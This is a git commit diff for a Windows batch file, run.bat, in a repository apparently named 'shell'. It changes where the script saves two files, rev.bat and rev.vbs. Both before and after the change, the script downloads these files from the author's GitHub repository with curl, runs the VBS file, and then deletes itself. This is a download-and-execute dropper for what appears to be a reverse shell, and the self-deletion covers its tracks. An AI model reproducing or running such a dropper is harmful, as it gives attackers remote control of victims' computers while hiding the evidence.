4a585738cb85b4b2130cc2351167b3a5368d460b
0x2034 <168307322+0x2034@users.noreply.github.com>
2024-05-05 06:00:12 +0300

    Update run.bat

--- run.bat
+++ run.bat
@@ -1,6 +1,6 @@
 @echo off
-curl https://raw.githubusercontent.com/0x2034/shell/main/rev.bat -o "%temp%\rev.bat"
-curl https://raw.githubusercontent.com/0x2034/shell/main/rev.vbs -o "%temp%\rev.vbs"
-call "%temp%\rev.vbs"
+curl https://raw.githubusercontent.com/0x2034/shell/main/rev.bat -o "%USERPROFILE%\Downloads\rev.bat"
+curl https://raw.githubusercontent.com/0x2034/shell/main/rev.vbs -o "%USERPROFILE%\Downloads\rev.vbs"
+call "%USERPROFILE%\Downloads\rev.vbs"
 del "%~f0"
 
